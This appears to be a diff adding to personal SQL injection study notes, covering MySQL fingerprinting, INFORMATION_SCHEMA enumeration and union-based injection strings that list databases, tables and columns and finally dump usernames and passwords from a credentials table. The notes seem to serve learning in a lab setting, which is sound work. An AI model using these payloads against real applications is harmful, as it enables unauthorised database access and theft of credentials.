@@ -559,4 +559,45 @@ SELECT * FROM logins WHERE (username='') AND password = '098f6bcd4621d373cade4e8
 select * from employees UNION SELECT *,1,1,1,1,1 FROM DEPARTMENT; # Example using NULL as filler
 
 
+*Database Enumeration*
+*Note:*
+1. If application is running on the apache/niginx then there is high chance that it is running MySQL
+2. If it's running on the IIS then it's a high chance tht it is running on the MSSQL
+
+`SELECT @@version` # for getting an version of the MYSQL
+`SELECT POW(1,1)` # IN MYSQL we will get the 1, In other dbms we will get an error
+`SELECT SLEEP(5)` # it will work on the MYSQL, In other dbms application will not delay it's response
+
+*INFORMATION_SCHEMA Database*
+*Note:*
+To dump the data from dbms using union query, we much have dbms, table and column names, so insted of this, we can use the INFORMATION_SCHEMA Database method
+INFORMATION_SCHEMA is a special database that stores information about other databases, tables, columns, etc.
+
+
+*SCHEMATA*
+The table SCHEMATA in the INFORMATION_SCHEMA database contains information about all databases on the server. he SCHEMA_NAME column contains all the database names currently present.
+`mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;` # query for listing out all the available database from the server
+
+The following Database is common.
+mysql
+information_schema
+performance_schema
+ # after this whatever comes is actual database.
+
+*MUST KEEP IN MIND WHILE EXPLOITING AN UNION BASED MANULLY*
+1. we need to use the special charector that is used for breaking a query befor fiding out the exact number of cloumn is used
+	ex: ' order by 1-- -
+2. we need to use some test data befor the special chars while retriving data from database using union
+	ex: cn' UNION select 1,@@version,3,4-- - # in this case cn is the test data cn' QUERY
+
+
+`cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` # query for listing out the databases using the information_schema method
+`cn' UNION select 1,database(),2,3-- -` # we can find the current databse which applicatin is using, by using this function database().
+`cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` # this command can be used to list out all the available tables in the dev database.
+`cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` # to get the column Information of the credentials table from dev db.
+`cn' UNION select 1, username, password, 4 from dev.credentials-- -` # after getting the column names then we can dump then using this command 
+
+
+
+
 
